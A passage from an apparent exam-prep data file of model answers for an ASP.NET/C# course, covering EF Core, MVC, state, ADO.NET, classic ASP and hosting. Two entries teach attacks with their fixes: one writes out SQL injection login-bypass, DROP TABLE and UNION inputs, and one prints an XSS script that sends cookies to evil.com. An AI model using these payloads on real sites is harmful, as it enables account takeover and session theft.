10-mark split between client-side caching concepts and EF Core write operations. Using LINQ-to-Objects instead of IQueryable, or forgetting SaveChanges, is what fails students.","how":"Half a page on cookies and uses, then three short EF blocks: update, delete, project. Name ExecuteUpdate only as an alternative.","skel":["Cookies: 4KB, sent every request, HttpOnly","Uses: login, preferences, cart id","Update: Where year 2022, set Price 2000","Delete: Where year 1981, RemoveRange","Select Brand where Price > 500"],"ans":"Client information is cached in the browser: cookies (a key/value of about 4KB sent with every request; Response.Cookies.Append(\"theme\", \"dark\", new CookieOptions { HttpOnly = true, Secure = true, SameSite = SameSiteMode.Lax })), query strings, hidden fields, and localStorage/sessionStorage for larger non-sensitive data (5-10MB, JavaScript only).\nUses: keeping the login ticket, remembering theme or language, holding a cart id, tracking a dismissed banner, and avoiding repeated server calls. Response caching also cuts latency and bandwidth.\nEF Core on BAG(ID, Brand, Price, Date):\npublic class Bag { public int ID { get; set; } public string Brand { get; set; }\n  public decimal Price { get; set; } public DateTime Date { get; set; } }\n// 1. Update the price to 2000 where published in 2022\nvar upd = await _db.Bags.Where(b => b.Date.Year == 2022).ToListAsync();\nupd.ForEach(b => b.Price = 2000);\nawait _db.SaveChangesAsync();\n// faster, no tracking: .ExecuteUpdateAsync(s => s.SetProperty(b => b.Price, 2000))\n// 2. Delete the books published in 1981\nvar del = _db.Bags.Where(b => b.Date.Year == 1981);\n_db.Bags.RemoveRange(del);\nawait _db.SaveChangesAsync();\n// 3. Retrieve the brand of books priced above 500\nvar brands = await _db.Bags.Where(b => b.Price > 500)\n                           .Select(b => b.Brand).ToListAsync();\nChange tracking means property edits are saved by SaveChanges without calling Update."},"ncc-40":{"u":6,"logic":"A broad question asking for the whole state toolkit plus working jQuery validation. It rewards a complete client/server table and a runnable handler.","how":"Two halves: state techniques grouped client and server with the login pattern, then one submit handler. Keep the code to eight lines.","skel":["HTTP is stateless, so state is carried or stored","Client: query, hidden, cookie, localStorage, JWT","Server: Session, TempData, ViewData, Cache","Login sets a cookie and stores the session","jQuery: flag, checks, preventDefault"],"ans":"HTTP is stateless: each request is independent, so the server cannot tell that two requests came from the same user. State is therefore carried by the client or stored on the server under an identifier.\nClient-side: query string (?page=2), hidden fields, cookies (session id, auth ticket — set HttpOnly, Secure, SameSite), localStorage/sessionStorage, and a JWT held in memory.\nServer-side: Session (per user, SessionId cookie, AddSession/UseSession), TempData (survives one redirect), ViewData/ViewBag (one request), Cache (application-wide), HttpContext.Items (one request).\nPattern: on login the server creates a session, sets an HttpOnly cookie and stores the cart in the session store; every later request sends the cookie and the server reloads the state.\njQuery validation (registration form):\n$(\"#reg\").on(\"submit\", function (e) {\n  var ok = true;\n  $(\"#reg input[required]\").each(function () {\n    if ($.trim($(this).val()) === \"\") { $(this).addClass(\"err\"); ok = false; }\n  });\n  if ($(\"#email\").val().indexOf(\"@\") < 0) ok = false;\n  if ($(\"#pwd\").val().length < 6) ok = false;\n  if (!ok) { e.preventDefault(); $(\"#msg\").text(\"Check the form\"); }\n});\nThe server repeats every rule with data annotations and ModelState.IsValid."},"ncc-41":{"u":1,"logic":"Tests whether you can join three unrelated syllabus items - a C# keyword pair, the delegate/event relationship, and the deployment pipeline - without writing event as a synonym for delegate.","how":"Anchor each part on one keyword: partial=split file, sealed=no inherit, event=encapsulated delegate; close with five deploy steps.","skel":["Partial class: one class across files, why","Sealed class: blocks inheritance, why needed","Delegate is the type, event is the wrapper","Deploy: publish, host, configure, verify"],"ans":"Partial class - one class written across several files with the partial keyword; the compiler merges the parts into one type. Needed when:\n• generated code (designer, EF scaffold, Razor) must stay separate from hand-written code, so regeneration does not delete your members;\n• a very large class is split between developers.\nRules: same name, namespace and accessibility.\n\nSealed class - cannot be inherited. Needed to stop a finished class being extended, to protect security or invariants (String is sealed), and to drop virtual dispatch. A sealed override blocks further overriding.\n\nDelegate vs event - a delegate is a type-safe reference to a method signature. An event is a delegate field marked event, so outside code can only subscribe (+=) or unsubscribe (-=), never invoke or overwrite it. The declaring class raises it.\n\nDeploy steps - dotnet publish -c Release; copy the publish folder; install the ASP.NET Core Hosting Bundle (or publish self-contained); set connection strings and ASPNETCORE_ENVIRONMENT; create the IIS site with ANCM or Nginx to Kestrel; test HTTPS and the health page."},"ncc-42":{"u":4,"logic":"Probes whether you understand why MVC exists, not just its three letters; weak answers define Model, View, Controller and stop, earning half marks.","how":"Define the three parts in one line each, then give five benefits - separation, testing, parallel work, clean URLs, reuse.","skel":["Model: data and rules","View: Razor markup","Controller: request to response","Benefits: separation, testing, clean URLs"],"ans":"MVC splits a web application into three cooperating parts:\n• Model - entities, business rules and validation; knows nothing about HTML.\n• View - Razor .cshtml template that renders the model.\n• Controller - receives the routed request, calls the model or service, and returns an action result.\n\nImportance in designing web applications:\n• Separation of concerns - markup, logic and data change independently, so a redesign never touches business rules.\n• Testability - controllers are plain classes, unit-testable without a browser.\n• Parallel work - designer and backend developer work on the same page at once.\n• Clean, extensionless, SEO-friendly URLs through routing; no ViewState, full control of the HTML sent.\n• Reuse - the same model and controller can serve an HTML view or a JSON API.\nPitfall: keep logic in services, not in fat controllers."},"ncc-43":{"u":4,"logic":"Checks the two-part skill behind every MVC page: knowing the naming and folder conventions, and knowing what must exist before Razor can return HTML.","how":"Write the four creation steps in order, one short code block, then list the rendering requirements as bullets.","skel":["Class ending Controller, inherits Controller","Action methods returning IActionResult","Route mapped in Program.cs","View at Views/Controller/Action.cshtml"],"ans":"Creating a controller:\n1. Add a class in the Controllers folder whose name ends with Controller, e.g. StudentController.\n2. Inherit from Controller (ControllerBase for a pure API).\n3. Add public action methods returning IActionResult.\n4. Map the route - conventional {controller}/{action}/{id?} via MapControllerRoute, or [Route(\"students\")] on the class.\n\npublic class StudentController : Controller {\n    public IActionResult Index() => View();\n    public IActionResult Details(int id) => Content($\"Id={id}\");\n}\n\nRequirements for rendering HTML:\n• a Razor view at Views/Student/Index.cshtml matching the controller and action names;\n• the action returns View() or View(model);\n• _ViewStart.cshtml points to _Layout.cshtml, which calls @RenderBody();\n• _ViewImports.cshtml registers tag helpers and namespaces;\n• UseStaticFiles() for CSS and JS, and the Razor view engine compiles the .cshtml."},"ncc-44":{"u":5,"logic":"Tests the one ADO.NET class that makes disconnected data possible, then the routing vocabulary; students often confuse the adapter with the reader.","how":"Two headings; adapter in three words (Fill, Update, disconnected), routing as five one-line features with a pattern example.","skel":["Adapter bridges DataSet and database","Fill reads, Update writes changes","Needs select plus insert/update/delete commands","Routing: patterns, constraints, link generation"],"ans":"Adapter class (SqlDataAdapter) - the bridge between the disconnected DataSet and the database:\n• Fill(dataSet, \"Movies\") runs the select command and loads rows into a DataTable; it opens and closes the connection itself if closed.\n• Update(dataSet) pushes Insert, Update and Delete back through InsertCommand, UpdateCommand and DeleteCommand.\n• It lets the application work disconnected - read, edit in memory, reconnect and save.\n• Constructed with a connection and a command: new SqlDataAdapter(\"SELECT * FROM Movie\", con).\n\nURL routing features:\n• Maps a URL pattern to controller, action and parameters instead of a physical file - /Student/Details/5.\n• Conventional routes with defaults {controller=Home}/{action=Index}/{id?} and attribute routes [Route(\"api/[controller]\")].\n• Constraints and optional segments: {id:int}, {slug:alpha}, {id?}.\n• Link generation through Url.Action and asp-action, so URLs live in one place.\n• Clean, extensionless, SEO-friendly URLs; supports areas and custom patterns."},"ncc-45":{"u":8,"logic":"Wants the mechanism (data becoming code) shown through one concrete login scenario, not a definition; the scenario carries most of the marks.","how":"One line of cause, one vulnerable line, the crafted input, the resulting query, variants - then the fix.","skel":["Cause: input concatenated into SQL","Login bypass with ' OR '1'='1' --","Show the final query text","Variants: DROP, UNION","Fix: parameters, least privilege"],"ans":"SQL injection happens when user input is concatenated into a SQL string, so the database cannot separate data from code.\n\nScenario - a login page builds:\nstring sql = \"SELECT * FROM Users WHERE Username='\" + txtUser.Text + \"' AND Password='\" + txtPass.Text + \"'\";\nThe attacker types  admin' OR '1'='1' --  as the username. The query becomes:\nSELECT * FROM Users WHERE Username='admin' OR '1'='1' --' AND Password=''\n'1'='1' is always true and -- comments out the password check, so the first row is returned and the attacker is logged in without a password.\n\nVariants: '; DROP TABLE Users -- deletes data; ' UNION SELECT CreditCard FROM Payments -- dumps other tables.\n\nChances are high wherever dynamic SQL, missing validation and an over-privileged database login exist. Fix: parameterised queries, stored procedures, an ORM such as EF Core, input validation and a least-privilege account."},"ncc-46":{"u":8,"logic":"Pairs an authorization concept with a state-management technique to see if you can keep identity rules and form data apart; the hidden-field half is often answered as 'for security', which is wrong.","how":"Claim = fact, policy = rule built from facts, then hidden field = round-trip value, not a secret.","skel":["Claim: name-value fact about the user","Policy: named rule using claims/roles","Register policy, apply with Authorize","Hidden field: primary key, returnUrl; not secure"],"ans":"Claim - a name-value statement about a user issued by a trusted authority: new Claim(\"Department\", \"HR\") or ClaimTypes.Role = \"Admin\". Claims travel in the authentication cookie or token and are read with User.HasClaim(\"Department\",\"HR\").\n\nPolicy - a named rule built from requirements (claims, roles, age, a custom handler), registered once:\nbuilder.Services.AddAuthorization(o => o.AddPolicy(\"HROnly\",\n    p => p.RequireClaim(\"Department\", \"HR\")));\napplied as [Authorize(Policy = \"HROnly\")]. A claim is a fact; a policy is the decision that consumes facts.\n\nHidden fields - an input the browser submits but never displays:\n<input type=\"hidden\" name=\"Id\" value=\"@Model.Id\" />  or  @Html.HiddenFor(m => m.Id)\nCreate one when a value must survive the round trip but must not be edited: primary key on an edit form, rowversion for concurrency, returnUrl. They are visible in page source, so never store secrets and always re-validate on the server."},"ncc-47":{"u":4,"logic":"Probes whether you know the container holds framework services as well as yours, and that registration is meaningless without a lifetime.","how":"Name the two categories, then the three lifetimes with one registration line each - the lifetimes are the marks.","skel":["Framework services registered by the host","Application services you register","Singleton, Scoped, Transient","AddScoped in Program.cs, inject by constructor"],"ans":"The IoC container manages two categories of services:\n• Framework services - registered by the host itself: IConfiguration, ILogger<T>, IHostEnvironment, IHttpContextAccessor, the options system.\n• Application services - the ones you register: DbContext, repositories, e-mail or payment services, your business classes.\nBoth sit in the same IServiceCollection and are resolved by constructor injection.\n\nRegistration in Program.cs always names a lifetime:\nbuilder.Services.AddSingleton<IClock, SystemClock>();           // one for the app\nbuilder.Services.AddScoped<IStudentService, StudentService>(); // one per request\nbuilder.Services.AddTransient<IMailer, SmtpMailer>();          // new each resolve\nbuilder.Services.AddDbContext<AppDbContext>(o => o.UseSqlServer(cs));\n\nThe container builds the object graph, injects constructor parameters including nested dependencies, and disposes IDisposable services when their lifetime ends. A scoped DbContext captured by a singleton is the classic captive-dependency bug."},"ncc-48":{"u":1,"logic":"Tests the collection/generics distinction and then forces you to prove it by writing one generic type that uses T in a field, constructor, property and method.","how":"Three contrast bullets, then one Box<T> class that covers all four required generic parts, then two calls.","skel":["Generic: typed, no boxing, compile-time safe","Non-generic: object, casts, runtime errors","Box<T> with field, ctor, property, method","Call with int and string"],"ans":"Generic collections (List<T>, Dictionary<K,V>, HashSet<T>) store a declared type; non-generic ones (ArrayList, Hashtable) store object.\n• Type safety - List<int> rejects a string at compile time; ArrayList accepts it and fails at run time.\n• No boxing, unboxing or casts, so generics are faster and allocate less.\n• IntelliSense and self-documenting code; non-generic needs a cast on every read.\n\nProgram - generic class with constructor, field, property and method:\nclass Box<T> {\n    private T _value;                                          // generic member variable\n    public Box(T value) { _value = value; }                    // generic constructor\n    public T Value { get => _value; set => _value = value; }    // generic property\n    public void Show() => Console.WriteLine($\"Value: {Value}\"); // generic method\n}\nclass Program {\n    static void Main() {\n        var a = new Box<int>(10); a.Show();\n        var b = new Box<string>(\"Nepal\"); b.Show();\n    }\n}\nOne class serves every type; constraints such as where T : class, new() restrict T."},"ncc-49":{"u":4,"logic":"Tests whether you know tag helpers are server-side and model-aware, not just 'HTML helpers'; the second half asks what they actually give you.","how":"Definition in two lines, then six provisions, then a three-line form snippet as proof.","skel":["Server-side attribute on HTML element","C# TagHelper class, Razor processes it","Provides binding, URLs, validation, token","Example: asp-for and asp-validation-for"],"ans":"Tag helpers are server-side attributes that Razor processes on ordinary HTML elements to generate the final markup. Each is a C# class deriving from TagHelper, enabled in _ViewImports.cshtml with @addTagHelper *, Microsoft.AspNetCore.Mvc.TagHelpers.\n\nWhat a tag helper provides:\n• Model binding - asp-for=\"Name\" writes id, name and value from the model, plus data-validation attributes.\n• URL generation - asp-action, asp-controller, asp-route-id build links from routing, not hard-coded strings.\n• Validation - asp-validation-for renders the error span; the form helper adds the anti-forgery token automatically.\n• Form and list handling - asp-action/asp-controller/method on <form>, asp-items for <select>.\n• Assets - asp-append-version adds a file hash; environment renders per environment.\n• Readable HTML-like markup with IntelliSense and compile-time checking, replacing @Html.TextBoxFor.\n\n<form asp-action=\"Create\" method=\"post\">\n  <input asp-for=\"Name\" class=\"form-control\" />\n  <span asp-validation-for=\"Name\" class=\"text-danger\"></span>\n</form>"},"ncc-50":{"u":1,"logic":"A pick-two short-note question; examiners want three tight definitions with one example each, and penalise anyone who writes a page on one topic.","how":"Write all three at 40 words each: lambda with syntax, CSRF as attack plus defence, SPA as one shell plus API.","skel":["Lambda: parameters => body, used in LINQ","CSRF: forged post with victim cookie","Defence: antiforgery token, SameSite","SPA: one shell, client routing, API"],"ans":"Lambda expression - an anonymous function, parameters => body, used wherever a delegate fits. Expression lambda returns a value: x => x * x. Statement lambda has a block: (a, b) => { return a + b; }. Used in LINQ (Where(s => s.Marks > 40)), events and Func/Action, so no separate named method is needed.\n\nCSRF (Cross-Site Request Forgery) - a malicious site makes the victim's logged-in browser post to your app, e.g. a hidden form to /Account/Delete carrying the victim's cookie, so the request looks genuine. Defence: anti-forgery tokens ([ValidateAntiForgeryToken], asp-antiforgery), SameSite cookies, Origin/Referer checks, re-authentication for sensitive actions.\n\nSPA (Single Page Application) - one HTML shell; JavaScript (React, Angular, Vue) handles routing and swaps views, calling a Web API for JSON. Pros: fast, app-like. Cons: heavy first download, weaker SEO, more client-side security care."},"ncc-51":{"u":2,"logic":"A classic-ASP recall question: five short items, marked one each; the risk is writing one long answer and leaving four blank.","how":"Five numbered lines, one or two sentences each; half a page total, no code.","skel":["ASP: IIS, virtual directory, script engine","Client vs server script: speed vs security","ADO: Connection, Command, Recordset","VBScript: ASP default language","Error handling: On Error Resume Next"],"ans":"a. ASP requirements - IIS (or PWS) with ASP enabled, a virtual directory with execute permission, a scripting engine (VBScript or JScript), .asp files, and NTFS rights for the anonymous user.\n\nb. Client-side vs server-side script - client script (JavaScript/VBScript) runs in the browser: instant feedback, no server load, but the source is visible and can be disabled. Server script (ASP) runs on the web server: it can read databases and files and is hidden from the user, but needs a round trip.\n\nc. ADO - ActiveX Data Objects, the COM data-access library of classic ASP; through OLE DB it opens a Connection, runs a Command and reads a Recordset.\n\nd. VBScript - Microsoft's lightweight interpreted subset of Visual Basic, the default scripting language of ASP pages, also used for old client-side scripting in Internet Explorer.\n\ne. Error handling - ASP uses On Error Resume Next and then checks Err.Number and Err.Description, with On Error GoTo 0 to reset; .NET uses try/catch/finally and custom exceptions."},"ncc-52":{"u":2,"logic":"Tests whether you know these are not alternatives: one is a page technology, the other is the server that runs it.","how":"Open with the one-line distinction, then four bullets on each side, then the closing 'not alternatives' sentence.","skel":["ASP is a server-side page technology","IIS is Microsoft's web server","ASP: interpreted, VBScript, built-in objects","IIS: ports, app pools, auth, logging"],"ans":"ASP (Active Server Pages) is a server-side technology for writing dynamic pages in VBScript or JScript inside .asp files, interpreted on each request, using the built-in Request, Response, Session and Application objects and ADO for data access.\n\nIIS (Internet Information Services) is Microsoft's web server: it listens on ports 80/443, accepts HTTP requests, serves static files, maps virtual directories, manages application pools, authentication, logging and HTTPS, and hosts ASP and ASP.NET applications.\n\nDifferences:\n• ASP is code that produces a page; IIS is the platform that executes and serves it.\n• ASP is interpreted per request with no compilation or code-behind; IIS is a Windows service configured through inetmgr.\n• ASP pages live in a virtual directory; IIS defines that directory and its permissions.\n\nThey are not alternatives - every classic ASP page runs on IIS, and the compiled successor of ASP (ASP.NET) is also hosted by IIS."},"ncc-53":{"u":6,"logic":"Tests the difference between data arriving with a request and data remembered between requests - the core of state management.","how":"Two headings, collections under Request, four lines of session code, then one comparison sentence.","skel":["Request: what the client sent, this request","QueryString, Form, Cookies, ServerVariables","Session: per-user server store, keyed by cookie","Session survives pages until timeout or Abandon"],"ans":"Request object - everything the client sent for the current request, exposed as read-only collections:\n• Request.QueryString(\"id\") - values after ? in the URL.\n• Request.Form(\"name\") - posted form fields.\n• Request.Cookies(\"user\") - cookies sent by the browser.\n• Request.ServerVariables(\"REMOTE_ADDR\") - client IP, server name, headers.\nIt exists only for the life of that one HTTP request.\n\nSession object - a per-user store on the server, created on first visit and identified by a session ID cookie:\nSession(\"user\") = \"ram\"\nResponse.Write(Session(\"user\"))\nSession.Timeout = 20      ' idle minutes before expiry\nSession.Abandon()         ' end it, e.g. on logout\nIt survives across pages until timeout or abandon, so it holds the login name, cart and permissions.\n\nDifference: Request carries data in for one request; Session remembers data between requests for one user. Session values consume server memory, so keep them small and never trust client-side data."},"ncc-54":{"u":1,"logic":"A classic-ASP recall item that checks whether you know the FileSystemObject pattern and the permission constraint behind it.","how":"One short VBScript block that reads a file, then write/append modes, then the .NET equivalent in a line.","skel":["CreateObject Scripting.FileSystemObject","OpenTextFile with mode 1, ReadAll","CreateTextFile or mode 8 to append","Server.MapPath, NTFS write permission","Modern: File.ReadAllText inside using"],"ans":"Classic ASP reaches files through the FileSystemObject and a TextStream:\n<%\nDim fso, f\nSet fso = Server.CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Server.MapPath(\"data.txt\"), 1)  ' 1 = ForReading\nResponse.Write f.ReadAll\nf.Close\n%>\nWriting: Set f = fso.CreateTextFile(Server.MapPath(\"log.txt\"), True) then f.WriteLine \"visited\" and f.Close; mode 8 appends to an existing file.\n\nUseful members: FileExists, DeleteFile, CreateFolder, GetFolder on the FSO; ReadLine, ReadAll, Write, WriteLine, AtEndOfStream on the TextStream. Server.MapPath converts the virtual path to a physical one. The anonymous IIS user needs NTFS write permission for writes.\n\nModern ASP.NET equivalent: using var r = new StreamReader(path); Response.Write(r.ReadToEnd()); or File.ReadAllText(path) - always inside using so the handle is released even on error."},"ncc-55":{"u":2,"logic":"Checks the classic COM mail component for sending, and whether you know plain ASP cannot receive mail without a POP3 component.","how":"Sending block with CDO.Message, one line for attachments, then state the receiving limitation honestly.","skel":["Send with CDO.Message or CDONTS","Set From, To, Subject, TextBody","Configure SMTP server, then Send","Receiving needs POP3 component or Exchange"],"ans":"Sending - classic ASP uses the CDO.Message COM component (CDONTS on old NT):\n<%\nDim mail\nSet mail = Server.CreateObject(\"CDO.Message\")\nmail.From = \"admin@college.edu.np\"\nmail.To = \"student@example.com\"\nmail.Subject = \"Result published\"\nmail.TextBody = \"Your result is on the portal.\"\nmail.Configuration.Fields.Item(\"http://schemas.microsoft.com/cdo/configuration/sendusing\") = 2\nmail.Configuration.Fields.Item(\"http://schemas.microsoft.com/cdo/configuration/smtpserver\") = \"smtp.college.edu.np\"\nmail.Configuration.Fields.Update\nmail.Send\n%>\nsendusing = 2 sends through a remote SMTP server; 1 drops the message in the local pickup folder. mail.AddAttachment \"C:\\report.pdf\" adds a file.\n\nReceiving - plain ASP cannot receive mail. A POP3/IMAP component such as JMail or ASPPOP3, or an Exchange/CDO mailbox configuration, must log in to the mailbox and read messages.\n\nIn ASP.NET Core the equivalent is SmtpClient or MailKit for sending; receiving still needs a mail server or a library."},"ncc-56":{"u":7,"logic":"Wants a working example, not a definition; the examiner looks for a submit handler that returns false and a note on why server validation remains.","how":"Define in two lines, then one compact validation function, then two benefits and two limits.","skel":["Runs in the browser, not the server","JavaScript against the DOM","Example: onsubmit returns false","Fast feedback, but bypassable"],"ans":"Client-side scripting is code that runs in the user's browser rather than on the server. The page arrives with a <script> block (JavaScript, or VBScript in old IE), the browser engine executes it against the DOM, so the page can validate, show or hide, animate and call the server with AJAX without a reload.\n\nExample - check a phone number before submit:\n<form onsubmit=\"return check()\">\n  <input id=\"phone\" /><span id=\"msg\"></span>\n  <button>Save</button>\n</form>\n<script>\nfunction check() {\n  var p = document.getElementById(\"phone\").value;\n  if (!/^[0-9]{10}$/.test(p)) {\n    document.getElementById(\"msg\").innerHTML = \"Phone must be 10 digits\";\n    return false;   // stops the submit\n  }\n  return true;\n}\n</script>\n\nBenefits: instant feedback, less server load, richer UI, works with AJAX and JSON.\nLimits: the source is visible, the user can disable JavaScript or post directly - so server-side validation is compulsory. jQuery, React and Angular build on the same idea."},"ncc-57":{"u":2,"logic":"A long question that pairs a conceptual 'why web forms' with a code proof; marks split roughly 30/70, so the program must be complete and compile in your head.","how":"Three lines on purpose and postback, then one program using List<T>, Dictionary and a generic class.","skel":["Web form collects input, posts back, validates","Server controls plus ViewState keep values","List<T> and Dictionary example","Box<T> generic class","No boxing or casts"],"ans":"Web form - the ASP.NET page (.aspx or Razor form) that collects user input. Its purpose: present labelled controls, post the values back to the server (postback), validate them, process them in code-behind and re-render the result. Server controls and ViewState keep values and raise events, so the developer works with properties rather than raw HTML.\n\nProgram - collection and generics together:\nclass Program {\n  static void Main() {\n    List<string> books = new List<string>();          // generic collection\n    books.Add(\"C# in Depth\"); books.Add(\"ASP.NET Core\");\n    Dictionary<string, int> price = new Dictionary<string, int>();\n    price[\"C# in Depth\"] = 900; price[\"ASP.NET Core\"] = 1200;\n\n    foreach (string b in books)\n      Console.WriteLine($\"{b} = Rs {price[b]}\");\n\n    List<int> marks = new List<int> { 40, 55, 72 };\n    int total = 0;\n    foreach (int m in marks) total += m;               // no cast, no boxing\n    Console.WriteLine(total);\n\n    Box<int> box = new Box<int>(5); box.Show();\n  }\n}\nclass Box<T> {\n  private T _v;\n  public Box(T v) { _v = v; }\n  public T Value { get => _v; set => _v = value; }\n  public void Show() => Console.WriteLine(Value);\n}\nList<T> is type-safe and avoids boxing, unlike ArrayList."},"ncc-58":{"u":8,"logic":"Three-part security question: uses of cookies, a taxonomy of web vulnerabilities, and one XSS attack shown concretely. The XSS payload is where marks are won.","how":"Cookies as five uses plus a safe-set line, a fast vulnerability list, then the stored-XSS payload and fix.","skel":["Cookies: session id, auth, cart, theme","Set HttpOnly, Secure, SameSite","Vulnerability list: XSS, SQLi, CSRF, IDOR","XSS: comment box stores a script tag","Defence: encode output, no Html.Raw"],"ans":"Cookies - small name-value text (4 KB maximum) the server sends in Set-Cookie and the browser returns on every request to that domain.\nUses: session ID so a stateless protocol remembers the user; authentication ticket and remember-me; shopping cart for anonymous visitors; theme and language preference; consent flags; analytics and A/B tracking.\nSet safely: Response.Cookies.Append(\"theme\", \"dark\", new CookieOptions { HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict });\n\nVulnerabilities that can occur: XSS, SQL injection, CSRF, open redirect, broken access control/IDOR, insecure deserialization, sensitive data exposure, clickjacking, misconfiguration, weak authentication.\n\nXSS case - a comment box stores raw input. The attacker posts:\n<script>fetch('http://evil.com?c='+document.cookie)</script>\nIf the view renders it with @Html.Raw(comment) instead of encoded output, the script runs in every visitor's browser and steals the session cookie.\nDefence: Razor output encoding, never Html.Raw on user data, input validation, HttpOnly cookies, Content-Security-Policy."},"ncc-59":{"u":9,"logic":"Joins deployment theory with a UI task; the examiner wants the in-process/out-of-process distinction and a validation script with a real submit guard.","how":"Two hosting models as a contrast pair, then one jQuery submit handler checking three library fields.","skel":["In-process: inside IIS worker, no proxy hop","Out-of-process: IIS to Kestrel on a port","Form: name, email, membership","jQuery checks, preventDefault on error","Server still re-validates"],"ans":"Two hosting models:\n• In-process - the application runs inside the IIS worker process (w3wp) through the ASP.NET Core Module; requests never leave the process, so it is faster and needs less configuration. Set by <AspNetCoreHostingModel>InProcess</AspNetCoreHostingModel>.\n• Out-of-process - IIS with ANCM reverse-proxies requests to a separate Kestrel process on localhost:5000. The app is isolated from IIS, restarts independently, and the same build runs behind Nginx on Linux. It costs one extra hop.\n\nClient-side validation for a Library Management System student form:\n$(\"#frm\").on(\"submit\", function (e) {\n  var name = $(\"#name\").val().trim(), email = $(\"#email\").val(), bad = 0;\n  if (name.length < 3) { $(\"#eName\").text(\"Name needs 3+ characters\"); bad++; }\n  if (!/^[^@]+@[^@]+\\.[a-z]{2,}$/i.test(email)) { $(\"#eEmail\").text(\"Invalid email\"); bad++; }\n  if (!$(\"#chk\").is(\":checked\")) { $(\"#eChk\").text(\"Accept library rules\"); bad++; }\n  if (bad) e.preventDefault();\n});\nWith unobtrusive validation you instead annotate the model with [Required] and [EmailAddress] and include _ValidationScriptsPartial, which generates the same rules. Client checks are UX only - the controller still tests ModelState.IsValid."},"ncc-60":{"u":8,"logic":"Tests the three layers of ASP.NET Core authorization and whether you can show where each is configured, not just define the words.","how":"Role, claim, policy in that order, one API call each, then the [Authorize] usage and the 403 flow.","skel":["Role: group, AddToRoleAsync","Claim: fact, AddClaimAsync","Policy: named rule in AddAuthorization","Apply with Authorize(Policy=...)","Cookie carries roles and claims"],"ans":"Roles - coarse groups. Create and assign with RoleManager and UserManager:\nawait roleManager.CreateAsync(new IdentityRole(\"Admin\"));\nawait userManager.AddToRoleAsync(user, \"Admin\");\n[Authorize(Roles = \"Admin\")] public IActionResult Dashboard() => View();\n\nClaims - fine-grained facts stored in AspNetUserClaims and copied into the cookie at login:\nawait userManager.AddClaimAsync(user, new Claim(\"Department\", \"HR\"));\nRead with User.HasClaim(\"Department\", \"HR\").\n\nPolicies - named rules that combine them, registered once:\nbuilder.Services.AddAuthorization(o =>\n  o.AddPolicy(\"HROfficer\", p => p.RequireRole(\"Manager\")\n                                .RequireClaim(\"Department\", \"HR\")));\nUsage: [Authorize(Policy = \"HROfficer\")] on a controller or Razor Page.\n\nFlow: login issues the cookie containing roles and claims; the policy handler evaluates each requirement; access is granted or the user gets 403. Roles answer 'which group', claims 'what is true', policies 'what is allowed'."},"ncc-61":{"u":8,"logic":"Combines the causes of injection with hosting knowledge; the trap is naming an attack type instead of the coding practices that allow it.","how":"List six causes fast, then contrast the two IIS host models in three lines each.","skel":["Concatenated SQL, no validation","Dynamic SQL, over-privileged login","Verbose errors reveal schema","In-process: inside w3wp, fastest","Out-of-process: ANCM to Kestrel"],"ans":"Problems that lead to SQL injection:\n• Concatenating user input into a query instead of parameterising it.\n• No input validation or type checking on ids, names and search boxes.\n• Dynamic SQL built with EXEC, and stored procedures that concatenate too.\n• An over-privileged database login (db_owner), so one injection can drop tables.\n• Detailed error messages that reveal table and column names; legacy ad-hoc queries.\n\nTwo ASP.NET Core host models:\n• In-process - the app runs in the IIS worker process via the ASP.NET Core Module; requests never leave the process, giving the best throughput, but the app recycles with the app pool.\n• Out-of-process - IIS/ANCM forwards requests over a local port to a separate Kestrel process; the app is isolated, easier to restart and monitor, slightly slower because of the extra hop.\nKestrel can also face the internet behind Nginx, the usual Linux and Docker choice."},"ncc-62":{"u":7,"logic":"Checks that you know SPA is a client architecture that still needs server decisions: API, authentication, state and first paint.","how":"Define SPA in two lines, then five server-side strategies - API, auth, state, SSR, caching.","skel":["One shell, client routing, JSON API","Server exposes Web API endpoints","State on server: session, cache, DB","Cookie or JWT, authorise every call","SSR or prerender for SEO"],"ans":"SPA (single page application) - the browser loads one HTML shell, then JavaScript (React, Angular, Vue) takes over routing and rendering and fetches JSON from a Web API on each navigation. No full page reload, so it feels like a desktop app; the cost is a large first download, extra client complexity and weaker SEO unless server-side rendering is added.\n\nServer-side strategies:\n• Serve the shell from MVC or static files and expose data through a Web API ([ApiController], JSON).\n• Keep state on the server: session for the logged-in user, IMemoryCache or Redis for shared data, the database for durable state - never trust client storage for security decisions.\n• Authenticate with a cookie or JWT and authorise every API call, not just the page.\n• Server-side rendering or prerendering for the first paint and for crawlers.\n• Bundling, Brotli compression, cache headers and a CDN; API versioning for old clients.\nClient routes must fall back to index.html on the server (MapFallbackToFile)."},"ncc-63":{"u":5,"logic":"A straight ADO.NET coding question; marks come from the connection-command-reader sequence and a WHERE clause that filters comedy.","how":"Five-line method: connection, command with @g parameter, ExecuteReader, while Read, close.","skel":["SqlConnection with connection string","SELECT with WHERE genre=@g","AddWithValue for comedy","ExecuteReader, loop Read()","Dispose with using"],"ans":"using Microsoft.Data.SqlClient;   // System.Data.SqlClient on .NET Framework\n\nstring cs = \"Server=.;Database=VideoDb;Trusted_Connection=True;\";\nusing (var con = new SqlConnection(cs)) {\n    con.Open();\n    var cmd = new SqlCommand(\"SELECT id, name, genre FROM MOVIE WHERE genre=@g\", con);\n    cmd.Parameters.AddWithValue(\"@g\", \"comedy\");   // parameter, not concatenation\n    using (var r = cmd.ExecuteReader()) {\n        while (r.Read())\n            Console.WriteLine($\"{r[\"id\"]}  {r[\"name\"]}  {r[\"genre\"]}\");\n    }\n}\n\nSteps: create the connection, open it, build the command with a parameter, call ExecuteReader (forward-only, connected), loop while Read(), read columns by name or index, then dispose through using so the connection closes even on error.\n\nFor a disconnected grid: var da = new SqlDataAdapter(cmd); var dt = new DataTable(); da.Fill(dt); then bind dt to the view. Use ExecuteScalar when only one value, such as COUNT(*), is needed."},"ncc-64":{"u":2,"logic":"Tests a distinction students blur - platform versus web framework - then whether you know the actual test tooling and the dotnet test command.","how":"One sentence each for .NET and ASP.NET, then the test ladder: unit, integration, UI, coverage.","skel":["NET: runtime plus base class library","ASP.NET: web framework on top","Unit tests: xUnit, Moq, dotnet test","Integration: WebApplicationFactory","Coverage and CI"],"ans":".NET is the platform: the CLR runtime, base class library and SDK that run any application - console, desktop, web, mobile, services. ASP.NET is a web framework built on .NET for websites and HTTP services; ASP.NET Core is its modern cross-platform rewrite.\nSo .NET supplies the engine and libraries, while ASP.NET supplies the web parts: request pipeline, routing, MVC, Razor, authentication middleware and Kestrel.\n\nTesting a .NET Core application:\n• Unit tests with 